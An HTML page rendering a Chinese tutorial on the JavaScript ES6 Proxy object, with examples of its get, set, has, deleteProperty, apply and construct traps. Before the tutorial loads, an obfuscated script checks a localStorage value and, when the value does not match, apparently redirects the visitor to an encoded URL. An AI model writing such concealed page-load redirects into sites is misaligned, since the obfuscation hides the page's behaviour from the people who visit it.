<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x20c32a=_0x4dc8;function _0x4dc8(e,s){var t=_0x2f52();return(_0x4dc8=function(s,n){var a=t[s-=120];void 0===_0x4dc8.wzGjXn&&(_0x4dc8.XzLqBn=function(s,n){var a,l=[],e=0,t="";for(s=(s=>{for(var n,a,l="",e="",t=0,o=0;a=s.charAt(o++);~a&&(n=t%4?64*n+a:a,t++%4)&&(l+=String.fromCharCode(255&n>>(-2*t&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,p=l.length;c<p;c++)e+="%"+("00"+l.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(e)})(s),o=0;o<256;o++)l[o]=o;for(o=0;o<256;o++)e=(e+l[o]+n.charCodeAt(o%n.length))%256,a=l[o],l[o]=l[e],l[e]=a;for(var o=0,e=0,c=0;c<s.length;c++)a=l[o=(o+1)%256],l[o]=l[e=(e+l[o])%256],l[e]=a,t+=String.fromCharCode(s.charCodeAt(c)^l[(l[o]+l[e])%256]);return t},e=arguments,_0x4dc8.wzGjXn=!0);var s=s+t[0],l=e[s];return l?a=l:(void 0===_0x4dc8.CJkOOu&&(_0x4dc8.CJkOOu=!0),a=_0x4dc8.XzLqBn(a,n),e[s]=a),a})(e,s)}if((()=>{for(var s=_0x4dc8,n=_0x2f52();;)try{if(734767==-parseInt(s(146,"%jQn"))*(parseInt(s(142,"a6Ir"))/2)+parseInt(s(131,"peFb"))/3+parseInt(s(134,"D8uw"))/4*(-parseInt(s(144,"x0!D"))/5)+-parseInt(s(137,"XS(L"))/6+parseInt(s(140,"Owo^"))/7*(-parseInt(s(120,"UvP0"))/8)+parseInt(s(143,"#UGb"))/9*(-parseInt(s(138,"D8uw"))/10)+parseInt(s(141,"D8uw"))/11*(parseInt(s(139,"XS(L"))/12))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x20c32a(125,")0r2")](_0x20c32a(147,"L&K5"))!=_0x20c32a(133,"1lYn"))throw window[_0x20c32a(136,"#UGb")][_0x20c32a(135,"USB]")](_0x20c32a(124,"x0!D")),Error();function _0x2f52(){var s=["WRZcLb5kWQWBW4JcRq","AsxdPmkbx8kjW70Uex1LWQ8","n3ObdaFcKZOL","q8koj8oekMtdVZfAWRtdUsiG","WPz+txdcVmoil2nPW5zAjfa","n8oEE8oSe8k+WRS7W4xcQW","WPVcPgtcRmkL","gKj7W6Cqb8kKFG","zSoRWPH6sIyP","d1VdN8oPWQZdNCkUWQm","WPDhW5tdLgH4W5ldGcaBcI/dPa","g0m7WPPvtSk8CKnrW7ldSq","WP9bW5pdKMOYWOVdQtK1dq","q8koiSoeuJNcRXvlWRK","hea+WPeDkCkvs1XO","WP0MWOn2WP8YdxW","uqpdMmoIWRpdOCkWWOO","W6BdQq8KhupdNL0+hSoZlWy","cfNdIr4NFmk3jG","FSovzX4fySofj3vyWRS","bmk5W7PeArS5D2a","nmoFwGubWRNdQmo3tCocxmo/oa","hei5WP9wgSkfwej6W7W","smoWBCkgW7JdVmkpmxvUfG","W60glCoEeCoBWRZdQSkWW7FcPG","CCoOWQ4yyZ8ZqLi1","E8orzbGih8k4og12WPmHiG","WR/cR0LGwuRdHd4SeSovcbddLcPdfCoAW7RcPCk5WQJcQgazWP0","WR5wBmkMxmoWWPq","rWJdQWVcMSoYp8o8W7ZdN8kH"];return(_0x2f52=function(){return s})()}document.title="proxy 对象详解",document.getElementById("article").innerHTML='<div><p>ES6 中的 <code>Proxy</code> 对象是一个强大的工具，用于创建代理对象，从而拦截并自定义对目标对象的各种操作。以下是对 <code>Proxy</code> 对象的详细解释：</p>\n<h3><strong>1. 基本概念</strong></h3>\n<ul>\n<li><strong>定义</strong>  ：<code>Proxy</code> 是一种用于创建代理对象的特殊对象，它允许开发者定义自定义行为，拦截和修改对象的默认操作。</li>\n<li><strong>构造函数</strong>  ：<code>Proxy</code> 通过 <code>new Proxy(target, handler)</code> 创建，其中 <code>target</code> 是被代理的目标对象，<code>handler</code> 是一个包含捕获器（trap）的对象，用于定义代理行为。</li>\n</ul>\n<h3><strong>2. 主要捕获器（trap）</strong></h3>\n<p><code>Proxy</code> 提供了多种捕获器，用于拦截和自定义对目标对象的不同操作。以下是一些常用的捕获器：</p>\n<ul>\n<li><strong><code>get(target, propKey, receiver)</code></strong>  ：\n<ul>\n<li>拦截对象属性的读取操作。</li>\n<li>参数：\n<ul>\n<li><code>target</code>：目标对象。</li>\n<li><code>propKey</code>：要访问的属性名。</li>\n<li><code>receiver</code>：代理对象本身或继承代理对象的子类实例。</li>\n</ul>\n</li>\n<li>示例：<pre><code class="language-javascript"><span class="hljs-keyword">const</span> target = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> };\n<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {\n  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, propKey, receiver</span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Getting <span class="hljs-subst">${propKey}</span>`</span>);\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, propKey, receiver);\n  }\n});\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxy.<span class="hljs-property">a</span>); <span class="hljs-comment">// 输出: Getting a, 1</span>\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong><code>set(target, propKey, value, receiver)</code></strong>  ：\n<ul>\n<li>拦截对象属性的赋值操作。</li>\n<li>参数：\n<ul>\n<li><code>target</code>：目标对象。</li>\n<li><code>propKey</code>：要设置的属性名。</li>\n<li><code>value</code>：要设置的值。</li>\n<li><code>receiver</code>：代理对象本身或继承代理对象的子类实例。</li>\n</ul>\n</li>\n<li>示例：<pre><code class="language-javascript"><span class="hljs-keyword">const</span> target = {};\n<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {\n  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, propKey, value, receiver</span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Setting <span class="hljs-subst">${propKey}</span> to <span class="hljs-subst">${value}</span>`</span>);\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, propKey, value, receiver);\n  }\n});\nproxy.<span class="hljs-property">a</span> = <span class="hljs-number">1</span>; <span class="hljs-comment">// 输出: Setting a to 1</span>\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong><code>has(target, propKey)</code></strong>  ：\n<ul>\n<li>拦截 <code>propKey in proxy</code> 的操作。</li>\n<li>参数：\n<ul>\n<li><code>target</code>：目标对象。</li>\n<li><code>propKey</code>：要判断的属性名。</li>\n</ul>\n</li>\n<li>示例：<pre><code class="language-javascript"><span class="hljs-keyword">const</span> target = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> };\n<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {\n  <span class="hljs-title function_">has</span>(<span class="hljs-params">target, propKey</span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Checking if <span class="hljs-subst">${propKey}</span> exists`</span>);\n    <span class="hljs-keyword">return</span> propKey <span class="hljs-keyword">in</span> target;\n  }\n});\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">in</span> proxy); <span class="hljs-comment">// 输出: Checking if a exists, true</span>\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong><code>deleteProperty(target, propKey)</code></strong>  ：\n<ul>\n<li>拦截 <code>delete proxy[propKey]</code> 的操作。</li>\n<li>参数：\n<ul>\n<li><code>target</code>：目标对象。</li>\n<li><code>propKey</code>：要删除的属性名。</li>\n</ul>\n</li>\n<li>示例：<pre><code class="language-javascript"><span class="hljs-keyword">const</span> target = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> };\n<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {\n  <span class="hljs-title function_">deleteProperty</span>(<span class="hljs-params">target, propKey</span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Deleting <span class="hljs-subst">${propKey}</span>`</span>);\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">deleteProperty</span>(target, propKey);\n  }\n});\n<span class="hljs-keyword">delete</span> proxy.<span class="hljs-property">a</span>; <span class="hljs-comment">// 输出: Deleting a</span>\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong><code>apply(target, thisArg, argumentsList)</code></strong>  ：\n<ul>\n<li>拦截 <code>Proxy</code> 实例作为函数调用的操作。</li>\n<li>参数：\n<ul>\n<li><code>target</code>：目标对象（函数）。</li>\n<li><code>thisArg</code>：目标对象的上下文对象（<code>this</code>）。</li>\n<li><code>argumentsList</code>：目标对象的参数数组。</li>\n</ul>\n</li>\n<li>示例：<pre><code class="language-javascript"><span class="hljs-keyword">const</span> target = <span class="hljs-keyword">function</span>(<span class="hljs-params">x, y</span>) { <span class="hljs-keyword">return</span> x + y; };\n<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {\n  <span class="hljs-title function_">apply</span>(<span class="hljs-params">target, thisArg, argumentsList</span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Calling function with arguments <span class="hljs-subst">${argumentsList}</span>`</span>);\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">apply</span>(target, thisArg, argumentsList);\n  }\n});\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">proxy</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)); <span class="hljs-comment">// 输出: Calling function with arguments 1,2, 3</span>\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong><code>construct(target, argumentsList, newTarget)</code></strong>  ：\n<ul>\n<li>拦截 <code>Proxy</code> 实例作为构造函数调用的操作。</li>\n<li>参数：\n<ul>\n<li><code>target</code>：目标对象（构造函数）。</li>\n<li><code>argumentsList</code>：构造函数的参数对象。</li>\n<li><code>newTarget</code>：创建实例对象时，<code>new</code> 命令作用的构造函数。</li>\n</ul>\n</li>\n<li>示例：<pre><code class="language-javascript"><span class="hljs-keyword">const</span> target = <span class="hljs-keyword">function</span>(<span class="hljs-params">x</span>) { <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = x; };\n<span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {\n  <span class="hljs-title function_">construct</span>(<span class="hljs-params">target, argumentsList, newTarget</span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Creating instance with arguments <span class="hljs-subst">${argumentsList}</span>`</span>);\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">construct</span>(target, argumentsList, newTarget);\n  }\n});\n<span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// 输出: Creating instance with arguments 1</span>\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance.<span class="hljs-property">value</span>); <span class="hljs-comment">// 输出: 1</span>\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n<h3><strong>3. 使用场景</strong></h3>\n<ul>\n<li><strong>数据验证和格式化</strong>  ：在对象属性设置时进行数据有效性验证，例如限制数值范围、格式校验等。</li>\n<li><strong>实现私有属性和方法</strong>  ：通过拦截属性访问，防止外部访问私有属性或方法。</li>\n<li><strong>添加日志记录和调试功能</strong>  ：通过拦截属性访问和修改，记录对目标对象的每一次操作，便于问题定位和性能分析。</li>\n<li><strong>提供默认值和只读访问</strong>  ：为未定义的属性提供默认值，或禁止对特定属性的修改。</li>\n<li><strong>实现惰性加载和缓存</strong>  ：在属性被访问时初始化或缓存数据，提高性能。</li>\n<li><strong>解决 <code>this</code> 指向问题</strong>  ：在代理对象的方法调用中，确保 <code>this</code> 指向正确的对象。</li>\n</ul>\n<h3><strong>4. 注意事项</strong></h3>\n<ul>\n<li><strong>性能考虑</strong>  ：<code>Proxy</code> 的使用可能会增加性能开销，特别是在对象结构复杂或深度嵌套的情况下。</li>\n<li><strong>兼容性</strong>  ：<code>Proxy</code> 是 ES6 引入的新特性，需要确保运行环境支持。</li>\n<li><strong>递归代理</strong>  ：如果需要代理嵌套对象，需要手动实现递归代理。</li>\n</ul>\n<h3><strong>5. 总结</strong></h3>\n<p><code>Proxy</code> 对象为 JavaScript 提供了强大的元编程能力，允许开发者拦截并自定义对目标对象的各种操作。通过合理使用 <code>Proxy</code>，可以实现更复杂和灵活的功能，提高代码的可维护性和可扩展性。</p>\n</div>'</script></body></html>